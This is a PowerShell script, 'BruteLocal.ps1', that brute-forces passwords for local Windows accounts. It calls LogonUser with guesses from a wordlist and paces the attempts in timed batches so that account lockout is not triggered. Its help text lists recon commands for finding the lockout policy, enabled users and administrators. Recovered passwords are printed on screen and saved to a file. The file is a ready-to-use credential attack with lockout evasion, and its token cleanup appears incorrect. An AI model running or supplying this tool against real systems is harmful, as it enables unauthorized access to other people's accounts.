<#
  BruteLocal.ps1 - Local logon tester
  v2.0 (09-Jul-2025) - Production-ready version
#>

[CmdletBinding()]
param(
    [Alias('u')] [string] $User,                          # user name OR path to a user list
    [Alias('w')] [string] $Wordlist = '.\wordlist.txt',   # password list
    [Alias('g')] [int]    $Guesses  = 9,                  # attempts per batch
    [Alias('t')] [int]    $Timeout  = 10,                 # minutes between batches
    [Alias('o')] [string] $Output,                        # output results to file
    [Alias('v')] [switch] $VerboseOutput,                 # verbose output
    [Alias('q')] [switch] $Quiet,                         # minimal output
    [Alias('s')] [switch] $Summary,                       # show summary at end
    [Alias('h')] [switch] $Help
)

# --------------------------------------------------------------------------- #
function Show-Help {
    $name = Split-Path -Leaf $PSCommandPath

    Write-Host ""
    Write-Host "$name - interactive logon tester for local accounts" -ForegroundColor Cyan

    Write-Host "Syntax" -ForegroundColor Yellow
    Write-Host "  .\$name -u detcontrol -w passwords.txt -g 9 -t 10" -ForegroundColor Gray
    Write-Host "  .\$name -u users.txt   -w rockyou.txt   -g 5 -t 30 -o results.txt" -ForegroundColor Gray
    Write-Host "  .\$name -u users.txt   -w common.txt    -v -s" -ForegroundColor Gray
    Write-Host ""

    Write-Host "Parameters" -ForegroundColor Yellow
    Write-Host "  -u | --user     User name OR path to a file with one user per line."
    Write-Host "  -w | --wordlist Path to password list.   Default: .\wordlist.txt"
    Write-Host "  -g | --guesses  Attempts before pause.   Default: 9"
    Write-Host "  -t | --timeout  Minutes to wait.         Default: 10"
    Write-Host "  -o | --output   Output results to file.  Optional."
    Write-Host "  -v | --verbose  Show additional details during execution."
    Write-Host "  -q | --quiet    Minimal output (success/failure only)."
    Write-Host "  -s | --summary  Show detailed summary at completion."
    Write-Host "  -h | --help     Display this help screen."
    Write-Host ""

    Write-Host "Recon tips" -ForegroundColor Yellow
    Write-Host "  Local lock-out policy ... " -NoNewline; Write-Host "net accounts" -ForegroundColor Gray
    Write-Host "  Enabled local users   ... " -NoNewline; Write-Host "Get-LocalUser | Where Enabled" -ForegroundColor Gray
    Write-Host "  Local administrators  ... " -NoNewline; Write-Host "Get-LocalGroupMember -Group Administrators" -ForegroundColor Gray
    Write-Host ""

    Write-Host "Purpose" -ForegroundColor Yellow
    Write-Host "  Cycle through passwords for one or more local accounts, pausing"
    Write-Host "  between batches to stay under the lock-out threshold."
    Write-Host ""
    exit
}

function Write-Log {
    param(
        [string]$Message,
        [string]$Color = "White",
        [string]$Level = "INFO"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"
    
    if (-not $Quiet) {
        Write-Host $logMessage -ForegroundColor $Color
    }
    
    if ($Output) {
        Add-Content -Path $Output -Value $logMessage
    }
}

function Write-Success {
    param([string]$Message)
    Write-Log -Message $Message -Color "Green" -Level "SUCCESS"
}

function Write-Info {
    param([string]$Message)
    if ($VerboseOutput -or -not $Quiet) {
        Write-Log -Message $Message -Color "Cyan" -Level "INFO"
    }
}

function Write-Warning {
    param([string]$Message)
    Write-Log -Message $Message -Color "Yellow" -Level "WARNING"
}

function Write-Error {
    param([string]$Message)
    Write-Log -Message $Message -Color "Red" -Level "ERROR"
}

function Show-Progress {
    param(
        [int]$PasswordsAttempted,
        [int]$UsersFound,
        [int]$TotalUsers,
        [int]$TimeoutMinutes
    )
    
    if (-not $Quiet) {
        Write-Warning "$PasswordsAttempted passwords attempted, $UsersFound/$TotalUsers users recovered. Waiting $TimeoutMinutes minutes to avoid account lockout"
    }
}

function Test-Prerequisites {
    # Check if running as administrator for better token handling
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if (-not $isAdmin) {
        Write-Warning "Not running as administrator. Some authentication methods may not work properly."
    }
    
    # Validate parameters
    if ($Quiet -and $VerboseOutput) {
        Write-Error "Cannot use -Quiet and -VerboseOutput together."
        exit 1
    }
    
    if ($Guesses -lt 1 -or $Guesses -gt 50) {
        Write-Error "Guesses parameter must be between 1 and 50."
        exit 1
    }
    
    if ($Timeout -lt 1 -or $Timeout -gt 1440) {
        Write-Error "Timeout parameter must be between 1 and 1440 minutes."
        exit 1
    }
}

# --------------------------------------------------------------------------- #

# Show help if requested or mandatory info missing
if ($Help -or -not $User) { Show-Help }

# Test prerequisites
Test-Prerequisites

# Initialize output file if specified
if ($Output) {
    $outputDir = Split-Path -Path $Output -Parent
    if ($outputDir -and -not (Test-Path $outputDir)) {
        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    }
    
    # Write header to output file
    $header = @"
BruteLocal.ps1 Results
===================
Started: $(Get-Date)
Target: $User
Wordlist: $Wordlist
Batch Size: $Guesses
Timeout: $Timeout minutes
Host: $env:COMPUTERNAME
User: $env:USERNAME

"@
    Set-Content -Path $Output -Value $header
}

Write-Info "Starting BruteLocal v2.0"
Write-Info "Target: $User"
Write-Info "Wordlist: $Wordlist"
Write-Info "Batch size: $Guesses attempts"
Write-Info "Timeout: $Timeout minutes"

# Validate word-list path
if (-not (Test-Path $Wordlist)) {
    Write-Error "Wordlist '$Wordlist' not found."
    exit 1
}

# Expand user argument into an array
$Users = if (Test-Path $User) { Get-Content -LiteralPath $User } else { ,$User }
Write-Info "Loaded $($Users.Count) user(s) for testing"

# Process users to handle domain\user format
$ProcessedUsers = @()
foreach ($U in $Users) {
    $Domain = $env:COMPUTERNAME
    $Name   = $U
    if ($U -match '^(?<dom>[^\\]+)\\(?<usr>.+)$') {
        $Domain = $Matches.dom
        $Name   = $Matches.usr
    }
    $ProcessedUsers += @{
        Original = $U
        Domain   = $Domain
        Name     = $Name
    }
}

# Load passwords
$Passwords = Get-Content -LiteralPath $Wordlist
Write-Info "Loaded $($Passwords.Count) passwords from wordlist"

# P/Invoke compile once per session
if (-not ('L' -as [type])) {
    Add-Type @"
using System;
using System.Runtime.InteropServices;

public class L {
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LogonUser(
        string user, string domain, string pass,
        int type, int provider, out IntPtr token);
}
"@
}

# --------------------------------------------------------------------------- #
# Main loop - Test all users with each password simultaneously
$FoundUsers = @()
$BatchCount = 0
$TotalAttempts = 0
$StartTime = Get-Date
$Results = @()

try {
    for ($i = 0; $i -lt $Passwords.Count; $i += $Guesses) {
        $Batch = @($Passwords | Select-Object -Skip $i -First $Guesses)  # always array
        $BatchCount++
        $PasswordsInBatch = 0

        Write-Info "Starting batch $BatchCount (passwords $($i+1) to $($i+$Batch.Count))"

        foreach ($Pw in $Batch) {
            $PasswordsInBatch++
            
            # Test this password against all users
            foreach ($UserInfo in $ProcessedUsers) {
                # Skip users we've already found passwords for
                if ($FoundUsers -contains $UserInfo.Original) {
                    continue
                }

                $TotalAttempts++
                $Tok = [IntPtr]::Zero
                
                if ([L]::LogonUser($UserInfo.Name, $UserInfo.Domain, $Pw, 2, 0, [ref]$Tok)) {
                    Write-Success "User '$($UserInfo.Original)' password found: $Pw"
                    $FoundUsers += $UserInfo.Original
                    
                    # Store result
                    $Results += @{
                        User = $UserInfo.Original
                        Domain = $UserInfo.Domain
                        Password = $Pw
                        Timestamp = Get-Date
                        AttemptNumber = $TotalAttempts
                    }
                    
                    # Proper token cleanup
                    if ($Tok -ne [IntPtr]::Zero) {
                        [void][Runtime.InteropServices.Marshal]::Release($Tok)
                    }
                    
                    # If we've found passwords for all users, exit
                    if ($FoundUsers.Count -eq $ProcessedUsers.Count) {
                        Write-Success "All user passwords found. Exiting."
                        break
                    }
                }
            }
            
            # Break out of password loop if all users found
            if ($FoundUsers.Count -eq $ProcessedUsers.Count) {
                break
            }
        }

        # Break out of batch loop if all users found
        if ($FoundUsers.Count -eq $ProcessedUsers.Count) {
            break
        }

        # Only sleep if there are more passwords to test and we haven't found all users
        if ($i + $Guesses -lt $Passwords.Count -and $FoundUsers.Count -lt $ProcessedUsers.Count) {
            Show-Progress -PasswordsAttempted $PasswordsInBatch -UsersFound $FoundUsers.Count -TotalUsers $ProcessedUsers.Count -TimeoutMinutes $Timeout
            Start-Sleep -Seconds ($Timeout * 60)
        }
    }
}
catch {
    Write-Error "An error occurred: $_"
    exit 1
}

# Final results
$EndTime = Get-Date
$Duration = $EndTime - $StartTime

if ($FoundUsers.Count -eq 0) {
    Write-Error "Finished. No valid passwords found."
    $exitCode = 1
} else {
    Write-Success "Finished. Found passwords for $($FoundUsers.Count) of $($ProcessedUsers.Count) users."
    $exitCode = 0
}

# Summary output
if ($Summary -or $VerboseOutput) {
    Write-Host ""
    Write-Host "=== SUMMARY ===" -ForegroundColor Cyan
    Write-Host "Duration: $($Duration.ToString('hh\:mm\:ss'))"
    Write-Host "Total attempts: $TotalAttempts"
    Write-Host "Batches processed: $BatchCount"
    Write-Host "Users tested: $($ProcessedUsers.Count)"
    Write-Host "Passwords found: $($FoundUsers.Count)"
    Write-Host "Success rate: $(if ($ProcessedUsers.Count -gt 0) { [math]::Round(($FoundUsers.Count / $ProcessedUsers.Count) * 100, 2) } else { 0 })%"
    
    if ($Results.Count -gt 0) {
        Write-Host ""
        Write-Host "=== CREDENTIALS FOUND ===" -ForegroundColor Green
        foreach ($Result in $Results) {
            Write-Host "User: $($Result.User) | Password: $($Result.Password) | Found at: $($Result.Timestamp.ToString('HH:mm:ss'))"
        }
    }
    
    if ($Output) {
        Write-Host ""
        Write-Host "Results saved to: $Output" -ForegroundColor Yellow
        
        # Append summary to output file
        $summaryOutput = @"

=== EXECUTION SUMMARY ===
Completed: $(Get-Date)
Duration: $($Duration.ToString('hh\:mm\:ss'))
Total attempts: $TotalAttempts
Batches processed: $BatchCount
Users tested: $($ProcessedUsers.Count)
Passwords found: $($FoundUsers.Count)
Success rate: $(if ($ProcessedUsers.Count -gt 0) { [math]::Round(($FoundUsers.Count / $ProcessedUsers.Count) * 100, 2) } else { 0 })%

=== CREDENTIALS FOUND ===
$($Results | ForEach-Object { "User: $($_.User) | Password: $($_.Password) | Domain: $($_.Domain) | Found at: $($_.Timestamp)" } | Out-String)
"@
        Add-Content -Path $Output -Value $summaryOutput
    }
}

exit $exitCode
